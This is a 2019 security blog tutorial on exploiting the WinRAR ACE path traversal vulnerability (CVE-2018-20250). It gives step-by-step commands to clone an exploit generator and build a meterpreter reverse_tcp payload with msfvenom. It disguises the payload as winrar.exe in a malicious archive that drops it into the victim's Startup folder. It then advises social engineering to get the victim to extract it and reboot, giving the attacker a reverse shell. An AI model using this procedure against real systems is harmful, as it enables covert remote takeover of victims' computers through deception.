<style>:root{--bg-color:#121212;--text-color:#ffffff;--accent-red:#ff4d4d;--accent-purple:#bb86fc;--secondary-color:#03dac6;--card-bg:#1e1e1e;--code-bg:#2d2d2d;--border-color:#333}body{background-color:var(--bg-color);color:var(--text-color);font-family:"Segoe UI",Roboto,Oxygen,Ubuntu,Cantarell,"Open Sans","Helvetica Neue",sans-serif;line-height:1.6;margin:0;padding:20px;max-width:1200px;margin:0 auto}.post-content{background-color:var(--card-bg);border-radius:8px;padding:30px;box-shadow:0 4px 6px rgba(0,0,0,0.3);margin-bottom:30px;color:var(--text-color) !important}h1,h2,h3,h4{color:var(--accent-purple);margin-top:1.5em}h3 span{color:var(--accent-red) !important}a{color:var(--secondary-color);text-decoration:none}a:hover{text-decoration:underline}pre,code{background-color:var(--code-bg);border-radius:4px;padding:2px 4px;font-family:Consolas,Monaco,"Andale Mono",monospace;color:#f8f8f2}pre{overflow-x:auto;padding:15px;border-left:3px solid var(--accent-purple)}img{max-width:100%;height:auto;display:block;margin:20px auto;border:1px solid var(--border-color)}ul,ol{padding-left:20px}li{margin-bottom:8px}.post-date,.post-cats{color:#aaa;font-size:0.9em;margin-bottom:20px}span,p{color:inherit !important}span[style*="color: #800000"]{color:var(--accent-red) !important}</style>
<div class="post-content">
            <div class="post-cats">
                <span class="cat-links"><a href="https://www.hackingarticles.in/category/others/" rel="category tag">Others</a></span>            </div>
            <h1 class="post-title entry-title">Code Execution from WinRAR</h1>            <div class="post-date">
                                    <div class="entry-meta">
                        <span class="posted-on"><a href="https://www.hackingarticles.in/code-execution-from-winrar/" rel="bookmark"><time class="entry-date published updated" datetime="2019-05-03T15:17:14+00:00">May 3, 2019</time></a></span><span class="post_by"> by <span class="author vcard"><a class="url fn n" href="https://www.hackingarticles.in/author/raj/">Raj</a></span></span>                    </div><!-- .entry-meta -->
                            </div>

            <div class="content post-excerpt entry-content clearfix">
                <p><span style="color: #000000;">In this post, we are going to discuss how WinRAR has patched serious security faults last month, one of the world’s most popular Windows file compression applications, which can only be exploited by tricking a WinRar user to extract malicious archives. The vulnerability identified last year by<span style="color: #0000ff;"> <a style="color: #0000ff;" href="//research.checkpoint.com/extracting-code-execution-from-winrar/">research.checkpoint.com</a></span> affects all versions released in all WinRAR over the past 19 years.</span></p>
<p><span style="color: #000000;"><strong>More About Evil Winrar</strong></span></p>
<p><span style="color: #000000;"><strong>CVE-ID:</strong> CVE-2018-20250, CVE-2018-20251, CVE-2018-20252, and CVE-2018-20253</span></p>
<p><span style="color: #000000;"><strong>Patched Version:</strong> <a style="color: #000000;" href="//www.win-rar.com/singlenewsview.html?&amp;L=0">WinRAR 5.70 Beta 1</a></span></p>
<p><span style="color: #000000;">This vulnerability is due to the UNACEV2.DLL library included with all versions of WinRAR. The winrar uses the ACE format to compress the folder and unpack the compressed folder with the help of UNACE.DLL.</span></p>
<p><span style="color: #000000;">In WinRAR versions prior to and including 5.61, There is path traversal vulnerability when crafting the filename field of the ACE format (in UNACEV2.dll). When the filename field is manipulated with specific patterns, the destination (extraction) folder is ignored, thus treating the filename as an absolute path. This happens due to improper compilation when unace.dll come into the face.</span></p>
<p><span style="color: #000000;">Let’s download a python script that will generate a malicious file archive in a rar format. Once you download the python script, install the dependency required for it.</span></p>
<pre class="lang:default decode:true">git clone //github.com/manulqwerty/Evil-WinRAR-Gen.git
cd Evil-WinRAR-Gen/
pip3 install -r requirements.txt</pre>
<p><span style="color: #000000;"><strong> <img decoding="async" src="//2.bp.blogspot.com/-Ksb5nO3a-8M/XMxZ8-_Yb4I/AAAAAAAAeMs/h4lVeOFZ3wMLVNctuHTeMLbVk8l3_MbawCLcBGAs/s1600/1.png"/></strong></span></p>
<p><span style="color: #000000;">Further, you need to give full permission to the python script inside the Evil-Winrar-Gen folder and then generate a malicious exe file with the help of msfvenom and name as “winrar.exe” as shown and multi handler inside Metasploit.</span></p>
<pre class="lang:default decode:true">chmod 777 evilWinRAR.py
msfvenom -p windows/meterpreter/reverse_tcp lhost=192.168.1.110 lport=1234 -f exe &gt; winrar.exe</pre>
<p><span style="color: #000000;"><strong> <img decoding="async" src="//3.bp.blogspot.com/-ZMZOEYU4d2o/XMxZ9G28wQI/AAAAAAAAeMw/1s2EgdLGU9wFsL8Sm7wVrlQ04M8ZE3BJQCLcBGAs/s1600/2.png"/></strong></span></p>
<p><span style="color: #000000;">Now create a text file that will display to the victim when he extracts the rar file to confuse him. Then execute evilWinrar python script along with malicious exe file and text file, creating a malicious archive that you can send to the target.</span></p>
<pre class="lang:default decode:true">touch winrar.txt
./evilWinRAR.py -e winrar.exe -g winrar.txt
python -m SimpleHTTPServer 8080</pre>
<p><span style="color: #000000;">As said, this vulnerability allows us to extract the malicious file in the arbitrary path, with the help of this script we will allow rar files extraction in the /startup program. Now use social engineering for transferring the malicious rar to the victim and wait for the victim to restart his machine to obtain reverse connection of the target.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="//1.bp.blogspot.com/-4LywAZOeUV0/XMxZ8s_8STI/AAAAAAAAeMo/KsgDbhgcjNAFR6EtWwF7vfFN_FTCJulxACLcBGAs/s1600/3.png"/></span></p>
<p><span style="color: #000000;">There is currently no startup program in the target machine as shown below. Once the victim extracts the malicious rar file “evil.rar,” our winrar.exe backdoor will extract from the startup program.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="//3.bp.blogspot.com/-Veaik_e1p0U/XMxZ9ZOObbI/AAAAAAAAeM0/tVAxWtEe1Iwte__xWfxP0fIVz1TreJeRQCLcBGAs/s1600/4.png"/></span></p>
<p><span style="color: #000000;">To ensure for winrar.exe file in the startup folder, type <strong>shell:startup</strong> in the run prompt.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="//3.bp.blogspot.com/-Iq5Mb5KSPFc/XMxZ9nwXbgI/AAAAAAAAeM4/zJtopN8fZ1gdY1UIlpjc1_BwZYeSun_BACLcBGAs/s1600/5.png"/></span></p>
<p><span style="color: #000000;">As soon as the victim will restart the machine, you will get a reverse connection as shown.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="//1.bp.blogspot.com/-eKOTJj80tEs/XMxZ-PE6dnI/AAAAAAAAeM8/OA4NfWcamg02OjTMPRmuidwzr-swZPXawCLcBGAs/s1600/6.png"/></span></p>
<p><span style="color: #000000;"><strong>Author: </strong>Aarti Singh is a Researcher and Technical Writer at Hacking Articles an Information Security Consultant Social Media Lover and Gadgets. Contact<strong><a style="color: #000000;" href="https://www.linkedin.com/in/aarti--singh/"> here</a></strong></span></p>
<div class="yarpp yarpp-related yarpp-related-website yarpp-template-thumbnails">
